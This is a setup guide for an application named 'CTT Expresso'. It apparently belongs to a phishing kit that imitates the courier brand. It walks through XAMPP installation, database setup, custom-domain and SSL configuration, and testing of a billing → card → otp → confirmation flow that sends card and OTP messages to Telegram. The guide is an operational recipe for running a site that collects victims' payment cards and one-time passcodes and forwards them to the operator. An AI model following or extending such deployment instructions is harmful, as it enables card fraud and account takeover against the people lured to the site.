# 🖥️ CTT Expresso - Windows RDP Setup Guide

## 🚀 Quick Setup for Windows Remote Desktop

### **Step 1: Install XAMPP on Windows RDP**

1. **Download XAMPP for Windows:**
   - Go to: https://www.apachefriends.org/download.html
   - Download latest XAMPP for Windows
   - Install to default location: `C:\xampp`

2. **Run XAMPP Control Panel:**
   - Run as **Administrator** (right-click → Run as administrator)
   - Start **Apache** service (should show green "Running")
   - Start **MySQL** service (should show green "Running")

### **Step 2: Upload Application Files**

1. **Copy files to XAMPP:**
   ```
   Copy all files to: C:\xampp\htdocs\ctt\
   ```

2. **File structure should be:**
   ```
   C:\xampp\htdocs\ctt\
   ├── config/
   ├── api/
   ├── billing.php
   ├── card.php
   ├── otp.php
   ├── confirmation.php
   ├── windows-setup.php
   └── ... other files
   ```

### **Step 3: Setup Database**

1. **Open browser and go to:**
   ```
   http://localhost/ctt/windows-setup.php
   ```

2. **Click "Setup Database for Windows RDP"**

3. **Should see:**
   ```
   ✅ Connected to MySQL server
   ✅ Database 'ctt_expresso' created
   ✅ All tables created successfully
   ✅ Telegram configuration inserted
   ✅ SUCCESS!
   ```

### **Step 4: Test Application**

1. **Test connection:**
   ```
   http://localhost/ctt/test-connection.php
   ```
   Should show all ✅ green checks

2. **Use application:**
   ```
   http://localhost/ctt/
   ```
   Complete flow: billing → card → otp → confirmation

---

## 🔧 Windows-Specific Configuration

### **Database Settings:**
- **Host:** localhost or 127.0.0.1
- **Port:** 3306 (default XAMPP)
- **User:** root
- **Password:** (empty) - XAMPP default

### **Common Windows Issues:**

#### **MySQL Won't Start:**
```cmd
# Check if port 3306 is in use
netstat -an | findstr :3306

# Stop conflicting services
net stop mysql
```

#### **Permission Errors:**
- Run XAMPP Control Panel as **Administrator**
- Check Windows User Account Control (UAC) settings
- Verify `C:\xampp` folder permissions

#### **Firewall Issues:**
- Add XAMPP to Windows Firewall exceptions
- Allow Apache (port 80) and MySQL (port 3306)

#### **Port Conflicts:**
- Change Apache port from 80 to 8080 if needed
- Change MySQL port from 3306 to 3307 if needed

---

## 🌐 Domain Configuration (Production)

### **For Custom Domain on RDP:**

1. **Install SSL Certificate:**
   - Use Let's Encrypt or purchased SSL
   - Configure in Apache `httpd-ssl.conf`

2. **Update Apache Virtual Host:**
   ```apache
   <VirtualHost *:80>
       DocumentRoot "C:/xampp/htdocs/ctt"
       ServerName yourdomain.com
       ServerAlias www.yourdomain.com
   </VirtualHost>
   
   <VirtualHost *:443>
       DocumentRoot "C:/xampp/htdocs/ctt"
       ServerName yourdomain.com
       SSLEngine on
       SSLCertificateFile "C:/xampp/apache/conf/ssl.crt/server.crt"
       SSLCertificateKeyFile "C:/xampp/apache/conf/ssl.key/server.key"
   </VirtualHost>
   ```

3. **Update Database Config:**
   - Change `localhost` to your server IP if needed
   - Update Telegram webhook URLs

---

## 📊 Performance Optimization (Windows RDP)

### **PHP Settings (C:\xampp\php\php.ini):**
```ini
memory_limit = 512M
max_execution_time = 60
upload_max_filesize = 100M
post_max_size = 100M
```

### **MySQL Settings (C:\xampp\mysql\bin\my.ini):**
```ini
max_connections = 200
innodb_buffer_pool_size = 256M
query_cache_size = 64M
```

### **Apache Settings (C:\xampp\apache\conf\httpd.conf):**
```apache
MaxRequestWorkers 200
ThreadsPerChild 50
```

---

## 🧪 Testing on Windows RDP

### **Local Testing:**
```
http://localhost/ctt/
http://127.0.0.1/ctt/
```

### **Network Testing:**
```
http://YOUR_RDP_IP/ctt/
http://yourdomain.com/ctt/
```

### **Telegram Testing:**
- Visit: `http://localhost/ctt/test-telegram.php`
- Should send test message to Telegram
- Verify both card and OTP messages work

---

## 🎯 Final Checklist

- ✅ XAMPP Apache & MySQL running
- ✅ Files in `C:\xampp\htdocs\ctt\`
- ✅ Database setup completed
- ✅ All connections tests pass
- ✅ Telegram integration working
- ✅ Full flow tested: billing → card → otp → confirmation
- ✅ Custom domain configured (if needed)

**Your CTT Expresso application is now ready for production on Windows RDP!** 🚀